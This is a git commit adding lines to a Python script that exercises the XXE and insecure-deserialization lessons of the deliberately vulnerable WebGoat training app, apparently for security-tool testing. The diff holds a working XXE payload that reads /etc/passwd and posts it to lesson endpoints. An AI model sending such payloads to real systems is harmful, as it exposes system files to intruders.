89ea29efb4274bb5626c767195eee073fa7d9d5f
Arshan Dabirsiaghi <arshan.dabirsiaghi@gmail.com>
2024-07-28 13:08:09 -0400

    exercise other stuff

--- exercise_sqli_5a.py
+++ exercise_sqli_5a.py
@@ -72,3 +72,39 @@ sqlinjection_payload = {
 
 response = session.post(sqlinjection5a_url, data=sqlinjection_payload)
 print("Exercised SQL injection code flow in 5a")
+
+# Access the xxe lesson
+xxe_payload = '''
+            <?xml version="1.0" encoding="utf-8"?>
+            <!DOCTYPE author [
+              <!ENTITY     
+             js
+              SYSTEM "file:///etc/passwd">
+            ]>
+            <comment><text>&js;</text></comment>
+            '''
+load_xxe_exercise_url = f'{webgoat_url}/start.mvc?username=' + username + '#lesson/XXE.lesson'
+response = session.get(load_xxe_exercise_url)
+if response.status_code == 200:
+    print('Accessed XXE lesson page.')
+else:
+    print(f'Failed to access XXE lesson page: {response.status_code}')
+
+simple_xxe_exercise_url = f'{webgoat_url}/xxe/simple'
+response = session.post(simple_xxe_exercise_url, data=xxe_payload, headers={'Content-Type': 'application/xml'})
+
+# Do the XXE exercise
+xxe_url = f'{webgoat_url}/xxe/content-type'
+
+# post the XML with an XML content type
+session.post(xxe_url, data=xxe_payload, headers={'Content-Type': 'application/xml'})
+# we expect a 500 here, so we don't check the response. the lesson still exercises and finds the XXE
+
+# Do the deserialization exercise
+print ("Exercising deserialization code flow")
+deserialization_url = f'{webgoat_url}/InsecureDeserialization/task'
+deserialization_payload = {
+    'token': 'rO0ABXQAVklmIHlvdSBkZXNlcmlhbGl6ZSBtZSBkb3duLCBJIHNoYWxsIGJlY29tZSBtb3JlIHBvd2VyZnVsIHRoYW4geW91IGNhbiBwb3NzaWJseSBpbWFnaW5l'
+}
+
+session.post(deserialization_url, data=deserialization_payload)
